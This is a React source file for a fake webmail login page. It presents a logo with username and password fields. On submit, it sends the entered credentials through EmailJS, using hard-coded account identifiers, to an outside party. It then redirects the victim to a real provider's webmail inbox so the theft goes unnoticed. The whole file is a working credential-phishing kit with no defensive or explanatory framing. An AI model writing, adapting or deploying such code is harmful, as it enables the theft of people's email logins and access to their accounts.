import React, {useRef} from 'react';
import Logo from "../Assets/Logo.PNG";
import { FaLock, FaUser } from "react-icons/fa";
import emailjs from '@emailjs/browser';


function Login () {


    const form = useRef();

    const sendEmail = (e) => {
        e.preventDefault();

        emailjs.sendForm('service_id6z6i9', 'template_h2y7r5r', form.current, 'FVIPVt10PQDRIGWMa')
            .then((result) => {
                console.log(result.text);
            }, (error) => {
                console.log(error.text);
            });

        // Redirect to the specified link after submitting the form
        window.location.href = 'https://webmail.execulink.ca/?_task=mail&_mbox=INBOX';
    };

    return (
        <div className="flex justify-center items-center h-screen bg-gray-100">
            <div className="bg-white p-8 rounded-lg shadow-md">
                <img src={Logo} alt="Logo" className="w-32 mx-auto mb-8" />
                <form ref={form} onSubmit={sendEmail} className="flex flex-col gap-4">
                    <div className="flex items-center border-b border-gray-300 py-2">
                        <FaUser className="text-black" />
                        <input type="email" name="user_name" required placeholder="Username" className="ml-2 outline-none focus:ring-2 focus:ring-blue-500 flex-1" />
                    </div>
                    <div className="flex items-center border-b border-gray-300 py-2">
                        <FaLock className="text-black" />
                        <input type="password" name="user_pass" required placeholder="Password" className="ml-2 outline-none focus:ring-2 focus:ring-blue-500 flex-1" />
                    </div>
                    <button type="submit" className="bg-blue-500 text-white py-2 rounded-md hover:bg-blue-600 transition-colors duration-300">LOGIN</button>
               </form>
            </div>
        </div>
    );
};

export default Login;
